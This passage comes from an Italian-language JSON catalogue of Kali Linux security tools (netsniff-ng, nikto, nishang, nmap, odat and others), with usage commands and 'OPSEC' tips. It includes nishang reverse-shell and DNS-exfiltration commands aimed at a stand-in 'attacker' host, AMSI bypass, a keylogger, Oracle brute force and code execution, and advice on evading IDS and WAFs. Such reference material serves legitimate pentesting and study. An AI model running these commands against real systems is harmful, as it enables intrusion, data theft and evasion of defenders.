BPF\nsudo netsniff-ng -i eth0 -f 'tcp port 80' -o http.pcap\n\n# Cattura con rotazione file (100MB per file)\nsudo netsniff-ng -i eth0 -o /captures/ -F 100MiB\n\n# Verbose con statistiche\nsudo netsniff-ng -i eth0 -o cap.pcap -s --verbose\n\n# TRAFGEN - Generazione traffico da config file\nsudo trafgen -i eth0 -c traffic.cfg -n 1000000\n\n# FLOWTOP - Monitor connessioni in tempo reale\nsudo flowtop -i eth0\n\n# IFPPS - Statistiche interfaccia\nsudo ifpps -d eth0\n\n# BPFC - Compila filtro BPF complesso\nbpfc -f 'tcp and port 443 and host 192.168.1.1'\n\n# CURVETUN - Tunnel crittografato\n# Server:\nsudo curvetun -s -p 4444 -k server.key\n# Client:\nsudo curvetun -c server_ip -p 4444 -k client.key\n\n# Replay PCAP su interfaccia\nsudo netsniff-ng -i eth0 --in capture.pcap -k1000</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Network Forensics Enterprise</strong>, quando si deve catturare traffico su link ad alta velocità senza perdite, netsniff-ng è la scelta standard. Data center, backbone links, e punti di aggregazione dove tcpdump perde pacchetti.</p><p>Durante <strong>Incident Response</strong>, la cattura completa del traffico è critica per ricostruire l'attività dell'attaccante. Netsniff-ng garantisce che nessun pacchetto vada perso durante l'acquisizione delle evidenze.</p><p>Per <strong>Performance Testing</strong>, trafgen può generare traffico ad alto volume per stress testing di firewall, IDS, e infrastruttura di rete. Configurazione flessibile permette di simulare pattern di traffico specifici.</p><p>Nel <strong>Security Monitoring</strong>, flowtop fornisce visibilità real-time sulle connessioni attive, utile per identificare anomalie, connessioni sospette, o data exfiltration in corso.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Operazione Passiva:</strong> netsniff-ng in modalità cattura è completamente passivo e non genera traffico. Non rilevabile dalla rete. trafgen invece inietta attivamente traffico.</p><p><strong>Promiscuous Mode:</strong> Richiede promiscuous mode sulla NIC per catturare tutto il traffico, non solo quello destinato all'host. Su switch moderni, richiede port mirroring/SPAN per vedere traffico di altri host.</p><p><strong>Storage Requirements:</strong> Cattura wire-speed genera volumi enormi di dati. 10Gbps saturato produce ~1.2GB/s. Pianificare storage adeguato e policy di retention. Considerare filtri BPF per ridurre volume.</p><p><strong>Legal Compliance:</strong> Intercettazione di traffico di rete può avere implicazioni legali. Verificare compliance con normative locali e policy aziendali prima di attivare cattura su reti di produzione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "nextnet",
    "name": "nextnet",
    "version": "0.0.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/nextnet/",
    "desc": "Tool per identificare subnet raggiungibili da un host tramite pivot point analysis.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Nextnet</strong> è uno strumento specializzato per la fase di post-exploitation che identifica tutte le reti raggiungibili da un host compromesso. Analizzando la routing table, le interfacce di rete, le connessioni attive e eseguendo probing selettivo, costruisce una mappa delle subnet a cui l'host ha accesso diretto o indiretto. Questa informazione è fondamentale per pianificare strategie di pivoting e lateral movement efficaci durante operazioni di red team.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Routing Table Analysis:</strong> Parsing completo della tabella di routing del sistema per identificare tutte le reti configurate, i gateway, e le metriche. Rileva route statiche, dinamiche, e VPN che potrebbero fornire accesso a segmenti di rete altrimenti isolati.</p><p><strong>Interface Enumeration:</strong> Lista tutte le interfacce di rete (fisiche, virtuali, tunnel) con relativi indirizzi IP, subnet mask, e stato. Identifica interfacce multiple che potrebbero indicare accesso a VLAN diverse o reti di management separate.</p><p><strong>Active Connection Analysis:</strong> Esamina le connessioni TCP/UDP attive per inferire reti raggiungibili basandosi sul traffico esistente. Connessioni verso subnet non presenti nella routing table possono indicare tunnel o proxy.</p><p><strong>Subnet Probing:</strong> Esegue test di raggiungibilità verso gateway e host rappresentativi per validare l'effettivo accesso alle reti identificate, distinguendo tra route teoriche e percorsi realmente utilizzabili.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Nextnet viene eseguito sull'host compromesso per mappare le opportunità di pivoting.</p><pre><code># Analisi completa dell'host corrente\nnextnet\n\n# Output dettagliato con informazioni di debug\nnextnet -v\n\n# Analizza routing table da file (per analisi offline)\nnextnet -r routes.txt\n\n# Esclude reti specifiche dall'output\nnextnet --exclude 192.168.1.0/24\n\n# Output in formato JSON per integrazione con altri tool\nnextnet --json > networks.json\n\n# Solo reti private (RFC1918)\nnextnet --private-only</code></pre><p>L'output evidenzia le subnet raggiungibili con informazioni sulla qualità del percorso e suggerimenti per tool di pivoting appropriati (chisel, ligolo, sshuttle).</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>Pivot Planning</strong>, dopo aver compromesso un host perimetrale o un jump server, nextnet rivela immediatamente quali reti interne sono raggiungibili, permettendo di prioritizzare i target più interessanti (es. subnet server, management network).</p><p>In operazioni di <strong>Red Team</strong>, la mappa delle reti raggiungibili guida la strategia di espansione del foothold. Un host con accesso a multiple VLAN diventa un pivot point di alto valore.</p><p>Per <strong>Network Segmentation Assessment</strong>, verificare da un host compromesso quali reti sono effettivamente isolate e quali invece sono raggiungibili nonostante le policy di sicurezza dichiarate.</p><p>Durante <strong>Incident Response</strong>, i difensori possono usare nextnet per capire l'impatto potenziale di una compromissione e quali segmenti di rete sono a rischio.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'analisi delle configurazioni locali (routing table, interfacce) è completamente passiva e non genera traffico. Il modulo di probing attivo invece invia pacchetti ICMP/TCP che possono essere rilevati da IDS e firewall.</p><p><strong>Impatto:</strong> Nessun impatto sul sistema host. Il probing può generare log su firewall e sistemi di monitoraggio nelle reti testate.</p><p><strong>Mitigazioni:</strong> Utilizzare la modalità passiva (--no-probe) in ambienti con monitoraggio aggressivo. Analizzare l'output offline se necessario. I risultati del probing confermano la raggiungibilità ma possono esporre l'attività.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "nikto",
    "name": "nikto",
    "version": "2.5.0",
    "icon": "../app/icons/nikto-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/nikto/",
    "desc": "Scanner web classico per vulnerabilità, misconfig server, file sensibili e CGI exploit.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Nikto</strong> è uno scanner web classico per vulnerabilità server. Testa migliaia di problemi: file sensibili, versioni software vulnerabili, misconfigurazione, CGI problems, e altro. Aggiornato regolarmente con nuove vulnerabilità. Tool fondamentale per web assessment.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>6700+ Tests:</strong> Ampio database di check.</p><p><strong>Version Detection:</strong> Identifica software e versioni.</p><p><strong>File Discovery:</strong> Trova file sensibili.</p><p><strong>Multiple Formats:</strong> Output HTML, XML, CSV.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan completo con SSL e output multi-formato\nnikto -h https://target.com -ssl -o report.html -Format html,csv,xml\n\n# Scan porte multiple contemporaneamente\nnikto -h target.com -p 80,443,8080,8443\n\n# Tuning granulare per test specifici\n# 1=Files, 2=Misconfig, 3=Info, 4=XSS, 5=Inj, 6=RFI, 7=Cmd, 8=SQLi, 9=DoS\nnikto -h target.com -Tuning 1234567890abc -Cgidirs all\n\n# Evasion WAF completa + randomizzazione\nnikto -h target.com -evasion 1234567 -useragent \"Mozilla/5.0\" -Pause 2\n\n# Autenticazione Basic/Digest\nnikto -h target.com -id admin:password\n\n# Scan con virtual host specifico\nnikto -h 192.168.1.10 -vhost internal.target.com\n\n# Pipeline: nmap -&gt; nikto su porte web trovate\nnmap -sV target.com -p- | grep http | awk '{print $1}' | \\\n  cut -d'/' -f1 | xargs -I{} nikto -h target.com -p {}\n\n# Scan con proxy (Burp) per analisi\nnikto -h target.com -useproxy http://127.0.0.1:8080</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Web Assessment</strong>, scan iniziale di vulnerabilità.</p><p>Nel <strong>Compliance</strong>, verifica configurazioni.</p><p><strong>Pentesting</strong> fase di discovery.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rumoroso:</strong> Migliaia di request. User-agent identificabile. Facilmente rilevato da WAF/IDS. Evasion mode può aiutare.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "nipper-ng",
    "name": "nipper-ng",
    "version": "0.11.10",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/nipper-ng/",
    "desc": "Analizzatore di configurazione per dispositivi di rete: Cisco, Juniper, firewall.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Nipper-ng</strong> (Network Infrastructure Parser) è un tool specializzato nell'analisi di sicurezza di file di configurazione di dispositivi di rete. Supporta un'ampia gamma di vendor: Cisco IOS/PIX/ASA/NX-OS, Juniper JunOS/ScreenOS, CheckPoint, Fortinet FortiGate, SonicWall, HP ProCurve, e molti altri. Analizza le configurazioni identificando: vulnerabilità note, misconfigurazioni di sicurezza, password deboli o in chiaro, ACL troppo permissive, servizi non necessari abilitati, mancanza di hardening, e deviazioni dalle best practice di sicurezza. Genera report dettagliati con severity rating, spiegazioni del rischio, e raccomandazioni di remediation specifiche. Strumento essenziale per audit di sicurezza di infrastrutture di rete.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Vendor Support:</strong> Parser nativi per decine di piattaforme: Cisco (IOS, IOS-XE, NX-OS, PIX, ASA, FWSM), Juniper (JunOS, ScreenOS), CheckPoint, Fortinet, SonicWall, Nortel/Avaya, HP ProCurve, 3Com, e dispositivi generici via parsing configurabile.</p><p><strong>Comprehensive Security Analysis:</strong> Verifica centinaia di check di sicurezza: password strength, encryption settings, AAA configuration, management protocols (SSH vs Telnet), logging, NTP, SNMP communities, routing protocol authentication, ACL analysis, NAT configuration, VPN settings.</p><p><strong>Best Practice Compliance:</strong> Confronta configurazioni con benchmark di sicurezza: CIS Benchmarks, NIST guidelines, vendor hardening guides. Identifica gap rispetto a standard di settore.</p><p><strong>Professional Reporting:</strong> Genera report in formati multipli (HTML, XML, text) con executive summary, findings dettagliati, severity CVSS-style, e raccomandazioni actionable. Ideale per deliverable di audit e compliance.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Nipper-ng analizza file di configurazione estratti dai dispositivi.</p><pre><code># Analizza router Cisco IOS\nnipper-ng --ios-router running-config.txt\n\n# Firewall Cisco ASA\nnipper-ng --asa asa-config.txt\n\n# Switch Cisco Catalyst\nnipper-ng --ios-switch switch-config.txt\n\n# Juniper JunOS\nnipper-ng --junos juniper-config.txt\n\n# CheckPoint firewall\nnipper-ng --checkpoint objects.C rules.W\n\n# Output HTML per report\nnipper-ng --ios-router config.txt --html > report.html\n\n# Output XML per integrazione\nnipper-ng --ios-router config.txt --xml > report.xml\n\n# Solo security issues (no informational)\nnipper-ng --ios-router config.txt --security\n\n# Con company name per report\nnipper-ng --ios-router config.txt --html --company \"Acme Corp\" > report.html\n\n# Analisi batch di multiple config\nfor cfg in configs/*.txt; do\n  nipper-ng --ios-router \"$cfg\" --html > \"reports/$(basename $cfg .txt).html\"\ndone</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>Security Audit</strong>, nipper-ng automatizza la review di configurazioni di decine o centinaia di dispositivi di rete. Identifica rapidamente vulnerabilità comuni che richiederebbero ore di analisi manuale.</p><p>Per <strong>Compliance Assessment</strong>, verifica che l'infrastruttura di rete rispetti policy di sicurezza aziendali, standard di settore (PCI-DSS, HIPAA, SOX), e hardening guideline vendor.</p><p>Nel <strong>Penetration Testing</strong>, dopo aver ottenuto accesso a dispositivi di rete, l'analisi delle configurazioni con nipper-ng rivela credenziali, trust relationships, e misconfigurazioni sfruttabili per lateral movement.</p><p>Per <strong>Change Management</strong>, confronto di configurazioni prima e dopo modifiche per verificare che i cambiamenti non introducano nuove vulnerabilità o degradino la security posture.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Operazione Offline:</strong> Nipper-ng analizza file di configurazione localmente senza generare traffico di rete. L'analisi può essere eseguita su sistemi air-gapped o in ambienti sicuri.</p><p><strong>Sensitive Data:</strong> I file di configurazione contengono informazioni critiche: password (anche se hashed), SNMP communities, pre-shared keys, topology di rete. Proteggere i file durante e dopo l'analisi. Eliminare in modo sicuro dopo l'uso.</p><p><strong>Report Sensitivity:</strong> I report generati elencano vulnerabilità specifiche dell'infrastruttura. Classificare come confidenziali e limitare distribuzione ai soli stakeholder autorizzati.</p><p><strong>Extraction Legale:</strong> Assicurarsi di avere autorizzazione per estrarre e analizzare le configurazioni dei dispositivi. In contesti di pentest, documentare il permesso di accedere alle config.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Service_Fingerprinting"
    ],
    "notes": null
  },
  {
    "id": "nishang",
    "name": "nishang",
    "version": "0.7.6",
    "icon": "../app/icons/nishang-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/nishang/",
    "desc": "Framework PowerShell per pentesting: shell, bypass, privilege escalation e exfiltration.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Nishang</strong> è un framework PowerShell per pentesting e red teaming. Include script per shell (bind, reverse, HTTP), bypass di security controls, privilege escalation, data exfiltration, backdoor, e keylogging. Tutto nativo PowerShell per operare su Windows senza binary esterni.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Shells:</strong> TCP, UDP, HTTP, ICMP reverse.</p><p><strong>Bypass:</strong> AMSI, AppLocker, UAC.</p><p><strong>Escalation:</strong> Token manipulation, DLL injection.</p><p><strong>Exfil:</strong> DNS, HTTP, Gmail, Pastebin.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Reverse shell TCP\nInvoke-PowerShellTcp -Reverse -IPAddress attacker -Port 4444\n\n# HTTP shell\nInvoke-PowerShellTcpOneLine -IPAddress attacker -Port 80\n\n# Bypass AMSI\nInvoke-AmsiBypass\n\n# Keylogger\nStart-KeyLogger\n\n# Exfiltration via DNS\nDo-Exfiltration -Type DNS -Data \"secret\" -DNSServer attacker</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Red Team</strong>, operazioni Windows PowerShell-only.</p><p>Nel <strong>Pentesting</strong>, post-exploitation nativa.</p><p><strong>Bypass</strong> di controlli security.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevabile:</strong> Script noti a AV/EDR. PowerShell logging attivo in enterprise. AMSI può bloccare. Offuscazione necessaria.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "04_Red_Team",
      "Payload_Generation"
    ],
    "notes": null
  },
  {
    "id": "nmap-kali",
    "name": "nmap",
    "version": "7.95",
    "icon": "../app/icons/nmap-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/nmap/",
    "desc": "Lo scanner di rete più usato al mondo: discovery, port scan, OS/service detection, NSE.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Nmap</strong> (Network Mapper) è LO scanner di rete più utilizzato al mondo. Esegue host discovery, port scanning, OS detection, service/version detection, e vulnerability scanning via NSE (Nmap Scripting Engine). Strumento fondamentale per ogni security professional.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Port Scanning:</strong> TCP SYN/Connect, UDP, etc.</p><p><strong>OS Detection:</strong> Fingerprinting del sistema operativo.</p><p><strong>Service Detection:</strong> Versioni software.</p><p><strong>NSE:</strong> 600+ script per vulnerability detection.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SCANNING BASE ===\nnmap target.com                     # Top 1000 porte\nnmap -sS -sV -p- target.com         # Full TCP con versioni\nnmap -sU --top-ports 100 target     # UDP top 100\n\n# === AGGRESSIVE RECON ===\nnmap -A -T4 -p- target.com          # OS, version, scripts, traceroute\nnmap -sC -sV -O target.com          # Default scripts + version + OS\n\n# === STEALTH / EVASION ===\n# Frammentazione pacchetti\nnmap -f -sS target.com\n# Decoy (nasconde tra IP fake)\nnmap -D RND:10 target.com\n# Source port spoofing (simula DNS/HTTP)\nnmap --source-port 53 -sS target.com\nnmap --source-port 80 -sS target.com\n# Slow scan (evita IDS threshold)\nnmap -T1 -sS --max-rate 10 target.com\n# Idle scan (truly anonymous via zombie)\nnmap -sI zombie_ip target.com\n\n# === NSE VULNERABILITY SCANNING ===\n# Tutti gli script vuln\nnmap --script vuln target.com\n# SMB vulnerabilità (EternalBlue, etc)\nnmap --script smb-vuln* -p445 target\n# SSL/TLS issues\nnmap --script ssl* -p443 target\n# Script specifici con args\nnmap --script http-sql-injection --script-args http-sql-injection.url=\"/search?q=test\" target\n\n# === SERVICE-SPECIFIC ENUM ===\n# SMB enumeration\nnmap --script smb-enum-shares,smb-enum-users,smb-os-discovery -p445 target\n# HTTP enumeration\nnmap --script http-enum,http-headers,http-methods,http-title -p80,443,8080 target\n# LDAP/AD\nnmap --script ldap-rootdse,ldap-search -p389,636 target\n\n# === OUTPUT FORMATS ===\nnmap -oA scan_all target        # Tutti i formati\nnmap -oX scan.xml target        # XML per parsing\nnmap -oG scan.grep target       # Grepable\nnmap --stylesheet scan.xsl -oX report.xml target  # HTML report\n\n# === PIPELINE AUTOMATION ===\n# Scan range, estrai IP attivi, scan profondo\nnmap -sn 192.168.1.0/24 -oG - | grep \"Up\" | awk '{print $2}' > alive.txt\nnmap -sS -sV -p- -iL alive.txt -oA detailed_scan\n\n# === NMAP + NSE EXPLOITATION ===\n# FTP anonymous + vuln check\nnmap --script ftp-anon,ftp-vuln* -p21 target\n# RCE check su servizi noti\nnmap --script http-vuln-cve2017-5638 -p80,8080 target  # Struts\nnmap --script rdp-vuln-ms12-020 -p3389 target          # BlueKeep\n\n# === PERFORMANCE TUNING ===\nnmap -T4 --min-rate 1000 --max-retries 2 -p- target     # Fast\nnmap --host-timeout 30m --max-scan-delay 1s target      # Reliable</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Network Recon</strong>, discovery e enumeration di qualsiasi rete.</p><p>Nel <strong>Pentesting</strong>, base di ogni assessment.</p><p><strong>Vulnerability Scanning</strong> con NSE scripts.</p><p><strong>Stealth Recon</strong> con tecniche di evasion.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevabile:</strong> Scan SYN visibili a IDS/firewall. Usa -T1 o --max-rate per stealth. Decoy (-D) e fragmentazione (-f) per evasion. Idle scan (-sI) per anonimato totale. NSE scripts generano traffico specifico identificabile.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "odat",
    "name": "odat",
    "version": "5.1.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/odat/",
    "desc": "Oracle Database Attacking Tool: enumeration, privilege escalation, code execution su DB Oracle.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>ODAT</strong> (Oracle Database Attacking Tool) è un toolkit per pentesting di database Oracle. Include moduli per enumeration, password brute force, privilege escalation, code execution via Java/PL-SQL, e upload/download file. Completo per assessment di infrastrutture Oracle.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>SID Guess:</strong> Enumera SID del database.</p><p><strong>Password Attack:</strong> Brute force credenziali.</p><p><strong>Privilege Escalation:</strong> Da user a DBA.</p><p><strong>Code Execution:</strong> Java, External Table, etc.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># SID enumeration\nodat sidguesser -s target.com\n\n# Password brute force\nodat passwordguesser -s target.com -d SID -U users.txt -P pass.txt\n\n# Upload file via DBMS_XSLPROCESSOR\nodat dbmsxslprocessor -s target -d SID -U user -P pass --putFile /tmp/ file.txt local.txt\n\n# Java code execution\nodat java -s target -d SID -U user -P pass --exec 'whoami'</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Oracle Pentesting</strong>, assessment completo.</p><p>Nel <strong>Database Security</strong>, test di configurazione.</p><p><strong>Privilege Escalation</strong> in Oracle.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Loggabile:</strong> Azioni database loggabili in audit. Brute force genera alert. Code execution molto visibile.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "Database"
    ],
    "notes": null
  },
  {
    "id": "ollydbg",
    "name": "ollydbg",
    "version": "1.10",
    "icon": "../app/icons/ollydbg-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ollydbg/",
    "desc": "Debugger x86 per Windows, usato per analisi malware e reverse engineering di binari PE.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>OllyDbg</strong> è un debugger assembly-level per Windows x86 che ha definito lo standard per il reverse engineering user-friendly. Nonostante non sia più sviluppato attivamente (l'ultima versione stabile è 1.10 del 2004, con 2.01 in beta), rimane uno dei debugger più utilizzati grazie alla sua interfaccia intuitiva e al ricco ecosistema di plugin. OllyDbg eccelle nell'analisi di binari PE senza simboli: il suo engine di analisi ricostruisce automaticamente funzioni, loop, switch statements, e chiamate API. Include disassembler integrato, hex editor, memory map viewer, e capacità di patching in memoria. Su Kali Linux viene eseguito tramite Wine per analizzare malware Windows in ambiente isolato.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Intelligent Disassembly:</strong> L'engine di analisi va oltre il semplice disassembly: riconosce funzioni, identifica loop e branch, risolve chiamate API Windows, e annota automaticamente il codice. Particolarmente efficace su binari stripped senza simboli di debug.</p><p><strong>Dynamic Debugging:</strong> Supporto completo per debugging: breakpoint software e hardware, conditional breakpoints, memory breakpoints, step into/over/out, watch expressions, e modifica registri/memoria in tempo reale.</p><p><strong>Plugin Ecosystem:</strong> Centinaia di plugin disponibili: OllyDump per dump di processi unpacked, OllyScript per automazione, anti-anti-debug plugin per bypassare protezioni, signature scanner, e molto altro.</p><p><strong>Binary Patching:</strong> Modifica direttamente byte in memoria o su disco. Assembla istruzioni inline, applica NOP, modifica jump conditions. Salva le modifiche come nuovo eseguibile.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Su Kali Linux, OllyDbg viene eseguito tramite Wine per analizzare binari Windows.</p><pre><code># Avvio OllyDbg con Wine\nwine ~/.wine/drive_c/ollydbg/ollydbg.exe\n\n# Carica eseguibile da analizzare\n# File -> Open -> seleziona file PE (.exe, .dll)\n\n# Shortcut essenziali:\n# F2 - Toggle breakpoint su istruzione corrente\n# F7 - Step into (entra nelle call)\n# F8 - Step over (esegue call senza entrare)\n# F9 - Run (continua esecuzione)\n# Ctrl+F9 - Execute till return\n# F12 - Pause execution\n# Ctrl+G - Go to address\n# Ctrl+F - Search for command\n# Ctrl+B - Search for binary pattern\n\n# Analisi strings\n# Right-click -> Search for -> All referenced strings\n\n# Trova chiamate API\n# Right-click -> Search for -> All intermodular calls\n\n# Patching\n# Seleziona istruzione -> Space -> modifica assembly\n# Right-click -> Copy to executable -> Save file</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Malware Analysis</strong>, OllyDbg permette analisi dinamica di sample Windows osservando comportamento in tempo reale: quali API vengono chiamate, quali file vengono creati, quali connessioni di rete vengono stabilite.</p><p>Nel <strong>Software Reverse Engineering</strong>, per comprendere il funzionamento di software closed-source: algoritmi di validazione licenze, protocolli di comunicazione proprietari, logica di business non documentata.</p><p>Per <strong>Exploit Development</strong>, debugging di shellcode e payload per verificare corretto funzionamento. Analisi di crash per identificare vulnerabilità sfruttabili.</p><p>Durante <strong>CTF e Crackme</strong>, OllyDbg è lo strumento classico per risolvere challenge di reverse engineering. L'interfaccia user-friendly lo rende ideale per chi si avvicina al reversing.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Ambiente Isolato:</strong> MAI eseguire malware sul sistema principale. Usare VM dedicata con snapshot, network isolato, e shared folder disabilitati.</p><p><strong>Anti-Debug Detection:</strong> Malware sofisticato rileva la presenza di debugger (IsDebuggerPresent, timing checks). Usare plugin anti-anti-debug come HideDebugger o ScyllaHide.</p><p><strong>Limitazione x86:</strong> OllyDbg supporta solo binari x86 32-bit. Per malware x64, usare x64dbg che offre interfaccia simile ma supporta architettura 64-bit.</p><p><strong>Wine Compatibility:</strong> Non tutto il malware Windows funziona correttamente sotto Wine. Per analisi accurata, considerare VM Windows dedicata.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "onesixtyone",
    "name": "onesixtyone",
    "version": "0.3.4",
    "icon": "../app/icons/onesixtyone-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/onesixtyone/",
    "desc": "Scanner SNMP veloce per brute force community string e discovery dispositivi di rete.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Onesixtyone</strong> è uno scanner SNMP ad alte prestazioni specializzato nel brute force di community string su larga scala. Il nome deriva dalla porta UDP 161 utilizzata da SNMP. A differenza di scanner generici, onesixtyone è ottimizzato specificamente per discovery SNMP: invia richieste GetRequest UDP in parallelo a migliaia di host simultaneamente, testando liste di community string. L'architettura asincrona permette di scansionare intere subnet di classe B in pochi minuti. Trova dispositivi con community string default (public, private), deboli, o custom, prerequisito essenziale per enumerazione SNMP approfondita con tool come snmpwalk.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Massively Parallel:</strong> Invia fino a 1000+ richieste UDP simultanee senza attendere risposte. L'architettura asynchronous fire-and-forget massimizza il throughput su reti di grandi dimensioni dove scan sequenziali richiederebbero ore.</p><p><strong>Community String Brute Force:</strong> Testa liste di community string contro ogni host. Include dizionari di community comuni (public, private, admin, manager, cisco, etc.) e supporta wordlist custom per ambienti specifici.</p><p><strong>Dual Input Mode:</strong> Accetta target come range CIDR, singoli IP, o file di host. Simultaneamente, community string possono essere specificate inline o da file, permettendo combinazioni flessibili.</p><p><strong>Output Minimale:</strong> Riporta solo successi: IP e community string funzionante. Output pulito ideale per piping verso altri tool o parsing automatizzato.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Sintassi semplice ottimizzata per scan rapidi su reti enterprise.</p><pre><code># Scan singola community su subnet\nonesixtyone 192.168.1.0/24 public\n\n# Brute force con file di community string\nonesixtyone -c /usr/share/doc/onesixtyone/dict.txt 192.168.1.0/24\n\n# Scan da file di host target\nonesixtyone -c communities.txt -i targets.txt\n\n# Scan range con community multiple inline\nonesixtyone 10.0.0.0/16 public private admin\n\n# Output verboso per debug\nonesixtyone -d 192.168.1.1 public\n\n# Combinazione: hosts da file, community da file\nonesixtyone -c /path/to/communities.txt -i /path/to/hosts.txt\n\n# Output tipico:\n# 192.168.1.1 [public] Linux router\n# 192.168.1.5 [private] Cisco IOS\n# 192.168.1.10 [admin] HP ProCurve\n\n# Pipeline con snmpwalk per enumerazione completa\nonesixtyone -c dict.txt 192.168.1.0/24 | awk '{print $1}' | \\\n  while read ip; do snmpwalk -c public -v2c $ip; done</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>Network Discovery</strong>, onesixtyone identifica rapidamente tutti i dispositivi con SNMP abilitato in una rete. Trova router, switch, stampanti, UPS, access point, e qualsiasi dispositivo gestibile via SNMP, spesso inclusi sistemi dimenticati o shadow IT.</p><p>Nel <strong>Penetration Testing</strong>, SNMP con community string deboli è un vettore d'attacco critico. Community 'public' permette lettura di informazioni sensibili (routing tables, ARP cache, utenti). Community 'private' spesso permette write access per riconfigurare dispositivi.</p><p>Per <strong>Security Assessment</strong>, verifica che policy aziendali di hardening SNMP siano implementate. Identifica dispositivi che usano ancora community default o deboli, violando best practice di sicurezza.</p><p>Nell'<strong>Asset Inventory</strong>, scan periodici con onesixtyone alimentano CMDB identificando nuovi dispositivi di rete. L'output include sysDescr che identifica vendor e modello.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Traffic Pattern:</strong> Genera burst di pacchetti UDP 161 facilmente identificabili. Network monitoring e SIEM rilevano volume anomalo di richieste SNMP. IDS ha signature specifiche per SNMP brute force.</p><p><strong>Community in Chiaro:</strong> SNMP v1/v2c trasmette community string in chiaro. Chiunque sniffi la rete può intercettare le community testate e quelle valide. Usare SNMPv3 con autenticazione per ambienti sicuri.</p><p><strong>Rate Limiting:</strong> Alcuni dispositivi implementano rate limiting o blocco IP dopo troppi tentativi falliti. Distribuire scan su periodi più lunghi per evitare detection e lockout.</p><p><strong>Mitigazioni:</strong> Ridurre parallelismo con -w (wait) flag se disponibile. Usare wordlist mirate invece di dizionari enormi. Preferire scan durante orari di alto traffico per mimetizzarsi. Combinare con altri traffic per mascherare pattern.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "SNMP"
    ],
    "notes": null
  },
  {
    "id": "ophcrack",
    "name": "ophcrack",
